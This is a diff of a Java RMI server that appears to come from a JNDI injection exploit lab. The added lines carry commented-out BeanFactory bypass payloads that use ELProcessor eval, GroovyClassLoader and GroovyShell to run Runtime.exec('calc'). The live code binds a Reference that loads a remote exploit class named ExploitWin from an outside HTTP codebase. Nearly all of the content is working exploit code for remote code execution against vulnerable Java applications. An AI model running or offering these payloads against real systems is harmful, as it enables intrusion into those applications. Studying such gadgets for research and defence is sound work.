@@ -10,11 +10,30 @@ public class NormalRMIServer {
 
     public static void main(String[] args) throws Exception {
         Registry registry = LocateRegistry.createRegistry(1097);
-        // 绕过方式的payload
+        // 绕过方式的payload之javax.el.ELProcessor（适用于Tomcat）
 //        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
-//        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
-//        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));
+//        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
+//        resourceRef.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\")"));
 
+      
+//    // 绕过方式的payload之groovy.lang.GroovyClassLoader（适用于Groovy 2.x）
+//    ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+//        ref.add(new StringRefAddr("forceString", "x=parseClass"));
+//    String script = String.format("@groovy.transform.ASTTest(value={\n" +
+//                    "    assert java.lang.Runtime.getRuntime().exec(\"%s\")\n" +
+//                    "})\n" +
+//                    "def x\n",
+//            "calc"
+//    );
+//    ref.add(new StringRefAddr("x",script));
+      
+      
+        // 绕过方式的payload之groovy.lang.GroovyShell（适用于Groovy 2.x & 1.x）
+//        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+//        ref.add(new StringRefAddr("forceString", "x=evaluate"));
+//        String script = String.format("'%s'.execute()", "calc"); //commandGenerator.getBase64CommandTpl());
+//        ref.add(new StringRefAddr("x",script));
+      
 
         // 普通方式的payload
         Reference ref = new Reference("whatever", "ExploitWin","http://192.168.85.1:8888/");
